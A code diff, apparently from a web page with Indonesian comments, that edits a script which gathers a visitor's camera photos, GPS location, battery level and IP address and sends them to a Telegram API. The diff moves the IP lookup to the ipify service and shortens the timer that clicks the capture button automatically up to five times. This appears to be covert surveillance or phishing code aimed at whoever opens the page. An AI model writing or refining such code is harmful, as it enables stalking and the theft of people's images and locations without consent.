@@ -64,25 +64,18 @@
                 deviceInfo.batteryLevel = battery.level * 100;
 
                 // Mengambil IP perangkat menggunakan layanan ipify
-                fetch('https://www.ip2location.com/demo/')
+                fetch('https://api.ipify.org?format=json')
                   .then(function(response) {
-                    return response.text();
+                    return response.json();
                   })
                   .then(function(data) {
-                    var parser = new DOMParser();
-                    var htmlDoc = parser.parseFromString(data, 'text/html');
-                    var ipElement = htmlDoc.querySelector('#demo-ip');
-                    var ispElement = htmlDoc.querySelector('#demo-isp');
-                    if (ipElement && ispElement) {
-                      deviceInfo.ipAddress = ipElement.textContent.trim();
-                      deviceInfo.isp = ispElement.textContent.trim();
-                    }
+                    deviceInfo.ipAddress = data.ip;
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   })
                   .catch(function(error) {
-                    console.error('Terjadi kesalahan dalam mendapatkan informasi ISP dan alamat IP:', error);
+                    console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   });
               })
@@ -153,7 +146,7 @@
       var button = document.getElementById('capture-btn');
       var clickCount = 0;
       var maxClicks = 5;
-      var delay = 4000; // Delay dalam milidetik (misal: 1000 = 1 detik)
+      var delay = 3000; // Delay dalam milidetik (misal: 1000 = 1 detik)
 
       var interval = setInterval(function() {
         button.click();
